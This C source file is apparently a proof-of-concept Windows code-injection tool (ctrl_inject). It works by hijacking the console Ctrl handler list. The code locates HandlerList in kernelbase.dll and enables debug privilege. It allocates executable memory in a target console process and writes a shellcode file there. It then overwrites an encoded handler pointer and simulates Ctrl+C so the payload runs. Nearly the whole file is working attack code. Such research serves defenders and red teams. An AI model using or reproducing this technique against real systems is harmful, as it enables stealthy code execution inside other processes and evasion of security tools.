/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#include "../ntlib/util.h"

typedef HRESULT(WINAPI *_RtlEncodeRemotePointer)(
  HANDLE    ProcessHandle,
  PVOID     Ptr,
  PVOID     *EncodedPtr);

typedef HRESULT(WINAPI *_RtlDecodeRemotePointer)(
  HANDLE    ProcessHandle,
  PVOID     Ptr,
  PVOID     *DecodedPtr);

BOOL WINAPI HandlerRoutine(DWORD dwCtrlType) {
    switch ( dwCtrlType ) {
      case CTRL_C_EVENT:
        return TRUE;
      default:
        return FALSE;
    }
}

// locate the virtual address of HandlerList in kernelbase.dll
LPVOID GetHandlerListVA(VOID) {
    PIMAGE_DOS_HEADER     dos;
    PIMAGE_NT_HEADERS     nt;
    PIMAGE_SECTION_HEADER sh;
    DWORD                 i, j, cnt;
    PULONG_PTR            ds;
    PHANDLER_ROUTINE      *HandlerList;
    HMODULE               m;
    LPVOID                ptr, va = NULL;
    
    // set handler
    SetConsoleCtrlHandler(HandlerRoutine, TRUE); 
    
    m   = GetModuleHandle(L"kernelbase.dll");
    dos = (PIMAGE_DOS_HEADER)m;  
    nt  = RVA2VA(PIMAGE_NT_HEADERS, m, dos->e_lfanew);  
    sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
          nt->FileHeader.SizeOfOptionalHeader);
          
    // locate the .data segment, save VA and number of pointers
    for(i=0; i<nt->FileHeader.NumberOfSections; i++) {
      if(*(PDWORD)sh[i].Name == *(PDWORD)".data") {
        ds  = RVA2VA(PULONG_PTR, m, sh[i].VirtualAddress);
        cnt = sh[i].Misc.VirtualSize / sizeof(ULONG_PTR);
        break;
      }
    }
    
    // for each pointer
    for(i=0; i<cnt; i++) {
      // if not heap pointer, skip it
      if(!IsHeapPtr((LPVOID)ds[i])) continue;
      // assume this is the HandlerList array
      HandlerList = (PHANDLER_ROUTINE*)ds[i];
      // decode second pointer in list
      ptr = DecodePointer((LPVOID)HandlerList[1]);
      // is it our handler?
      if(ptr == HandlerRoutine) {
        // save virtual address and exit loop
        va = &ds[i];
        break;
      }
    }
    // remove handler
    SetConsoleCtrlHandler(HandlerRoutine, FALSE);
    return va;
}

VOID ctrl_list(DWORD pid) {
    PROCESSENTRY32          pe;
    HANDLE                  ss, hp;
    PHANDLER_ROUTINE        *HandlerList, Handler;
    SIZE_T                  rd;
    LPVOID                  hl_va, ptr;
    DWORD                   i;
    HRESULT                 res;
    _RtlDecodeRemotePointer RtlDecodeRemotePointer;
    
    hl_va = GetHandlerListVA();
    
    if(hl_va == NULL) {
      wprintf(L"WARNING: Unable to resolve address of HandlerList\n");
      return;
    }
    
    RtlDecodeRemotePointer = (_RtlDecodeRemotePointer)
      GetProcAddress(GetModuleHandle(L"ntdll"), "RtlDecodeRemotePointer");
    
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(ss == INVALID_HANDLE_VALUE) return;
    
    pe.dwSize = sizeof(PROCESSENTRY32);

    if(Process32First(ss, &pe)){
      do {
        if(pid != 0 && pe.th32ProcessID != pid) continue;
        
        hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
        if(hp != NULL) {
          SymInitialize(hp, NULL, TRUE);
          
          // read the heap pointer from remote process
          ReadProcessMemory(hp, hl_va, &HandlerList, sizeof(ULONG_PTR), &rd);        
          
          printf("\nHandlerList: %p for %04i : %ws\n", 
            (LPVOID)HandlerList, pe.th32ProcessID, pe.szExeFile);
            
          // read each pointer
          for(i=0;;i++) {
            ptr = (PBYTE)HandlerList + (i * sizeof(ULONG_PTR)); 
            ReadProcessMemory(hp, ptr, &ptr, sizeof(ULONG_PTR), &rd);
            RtlDecodeRemotePointer(hp, ptr, (PVOID*)&Handler);
            if(!IsCodePtrEx(hp, Handler)) break;
            printf("%p : %ws\n", Handler, addr2sym(hp, Handler));
          }
          SymCleanup(hp);
          CloseHandle(hp);
        }
      } while(Process32Next(ss, &pe));
    }
    CloseHandle(ss);
}

// simulate CTRL+C
void SendCtrlC(HWND hWnd) {
    INPUT ip;
    
    SetForegroundWindow(hWnd);
    
    ip.type           = INPUT_KEYBOARD;
    ip.ki.wScan       = 0;
    ip.ki.time        = 0;
    ip.ki.dwExtraInfo = 0;
    
    ip.ki.wVk         = VK_CONTROL;
    ip.ki.dwFlags     = 0;
    SendInput(1, &ip, sizeof(INPUT));

    ip.ki.wVk         = 'C';
    ip.ki.dwFlags     = 0;
    SendInput(1, &ip, sizeof(INPUT));
    
    ip.ki.wVk         = 'C';
    ip.ki.dwFlags     = KEYEVENTF_KEYUP;
    SendInput(1, &ip, sizeof(INPUT));
    
    ip.ki.wVk         = VK_CONTROL;
    ip.ki.dwFlags     = KEYEVENTF_KEYUP;
    SendInput(1, &ip, sizeof(INPUT));
    
    Sleep(1000);
}

void ctrl_inject(DWORD pid, LPVOID payload, DWORD payloadSize) {
    HANDLE                  hp;
    SIZE_T                  rd, wr;
    DWORD                   i, id;
    HWND                    hw = NULL;
    PHANDLER_ROUTINE        *HandlerList, Handler;
    LPVOID                  hl_va, heap_ptr, enc_ptr, last_ptr, cs;
    _RtlDecodeRemotePointer RtlDecodeRemotePointer;
    _RtlEncodeRemotePointer RtlEncodeRemotePointer;
    
    // 1. Resolve virtual address of HandlerList and function encoders
    for(;;) {
      hw = FindWindowEx(NULL, hw, L"ConsoleWindowClass", NULL);
      if(hw == NULL) break;
      
      GetWindowThreadProcessId(hw, &id);
      if(id == pid) break;
    }
    
    hl_va = GetHandlerListVA();
    
    RtlDecodeRemotePointer = (_RtlDecodeRemotePointer)
      GetProcAddress(GetModuleHandle(L"ntdll"), 
      "RtlDecodeRemotePointer");

    RtlEncodeRemotePointer = (_RtlEncodeRemotePointer)
      GetProcAddress(GetModuleHandle(L"ntdll"), 
      "RtlEncodeRemotePointer");

    if(hw                     == 0    ||
       hl_va                  == NULL ||
       RtlDecodeRemotePointer == NULL ||
       RtlDecodeRemotePointer == NULL) return;
       
    // 2. Open process for read,write and allocate operations
    hp = OpenProcess(
      PROCESS_VM_OPERATION |
      PROCESS_VM_READ      |
      PROCESS_VM_WRITE, 
      FALSE, 
      pid);
      
    if(hp == NULL) return;

    // 3. Read the heap pointer from remote process
    ReadProcessMemory(hp, hl_va, 
      &HandlerList, sizeof(ULONG_PTR), &rd);        
      
    // read each pointer to find last one in list
    for(last_ptr = NULL, i = 0;; i++) {
      heap_ptr = (PBYTE)HandlerList + (i * sizeof(ULONG_PTR)); 
      
      // read encoded pointer
      ReadProcessMemory(hp, heap_ptr, &enc_ptr, sizeof(ULONG_PTR), &rd);
      
      // decode it
      RtlDecodeRemotePointer(hp, enc_ptr, (PVOID*)&Handler);
      
      // if this doesn't point to code in remote process, exit loop
      if(!IsCodePtrEx(hp, Handler)) break;

      // save heap address of this handler
      last_ptr = heap_ptr;
    }
    
    // if we have a heap address of handler
    if(last_ptr != NULL) {
      // backup existing encoded handler
      ReadProcessMemory(hp, last_ptr, 
        &enc_ptr, sizeof(ULONG_PTR), &rd);
      
      // allocate RWX memory in remote process
      cs = VirtualAllocEx(
        hp, 
        NULL, 
        payloadSize, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE);
        
      if(cs != NULL) {
        // write payload
        WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
        
        // encode pointer to payload
        RtlEncodeRemotePointer(hp, cs, (PVOID*)&Handler);
        
        // overwrite pointer in HandlerList for remote process
        WriteProcessMemory(hp, last_ptr, 
          &Handler, sizeof(PHANDLER_ROUTINE), &wr);
          
        // execute
        SendCtrlC(hw);

        // restore original function
        WriteProcessMemory(hp, last_ptr, 
          &enc_ptr, sizeof(PHANDLER_ROUTINE), &wr); 

        VirtualFreeEx(hp, cs, 0,  MEM_RELEASE);
      }
    }
    CloseHandle(hp);
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
    WCHAR cls[MAX_PATH];
    
    GetClassName(hwnd, cls, MAX_PATH);
    printf("%p : %ws\n", (LPVOID)hwnd, cls);
    return TRUE;
}

BOOL CALLBACK EnumThreadWndProc(HWND hwnd, LPARAM lParam) {
    WCHAR cls[MAX_PATH];
    
    GetClassName(hwnd, cls, MAX_PATH);
    printf("%p : %ws\n", (LPVOID)hwnd, cls);
    
    EnumChildWindows(hwnd, EnumChildProc, lParam);
    return TRUE;
}

VOID EnumProcessWindows(DWORD pid) {
    DWORD         i, cnt = 0;
    HANDLE        ss;
    THREADENTRY32 te;

    // create snapshot of system
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if(ss == INVALID_HANDLE_VALUE) return;
    
    // gather list of threads
    te.dwSize = sizeof(THREADENTRY32);
    
    if(Thread32First(ss, &te)) {
      do {
        // if not our target process, skip it
        if(pid != 0 && te.th32OwnerProcessID != pid) continue;
        
        EnumThreadWindows(te.th32ThreadID, EnumThreadWndProc, 0);
      } while(Thread32Next(ss, &te));
    }
    CloseHandle(ss);
}

VOID ListConsoles(VOID) {
    DWORD  i, cnt = 0;
    PDWORD list;
    
    cnt = GetConsoleProcessList(&cnt, 1);
    
    list = (PDWORD)malloc(cnt * sizeof(DWORD));
    if(list != NULL) {
      GetConsoleProcessList(list, cnt);
      
      for(i=0; i<cnt; i++) {
        printf("%ws : %i\n", pid2name(list[i]), list[i]);
      }
      free(list);
    }
}

int wmain(int argc, WCHAR *argv[]) {
    DWORD  pid = 0;
    SIZE_T len;
    LPVOID pic;
    
    ListConsoles();
    
    SetPrivilege(SE_DEBUG_NAME, TRUE);
    SymSetOptions(SYMOPT_DEFERRED_LOADS);
    
    if(argc < 2) {
      printf("\nusage: ctrl_inject <process> <payload.bin>\n");
      return 0;
    }

    pid = name2pid(argv[1]);
    
    if(pid == 0) pid = wcstoull(argv[1], NULL, 10);
    if(pid == 0) { 
      printf("unable to obtain process id for %ws\n", argv[1]);
      return 0;
    }
    
    if(argc == 3) {
      len = readpic(argv[2], &pic);
      if (len == 0) { printf("\ninvalid payload\n"); return 0;}
      ctrl_inject(pid, pic, len);
    } else {
      ctrl_list(pid);
    }
    return 0;
}

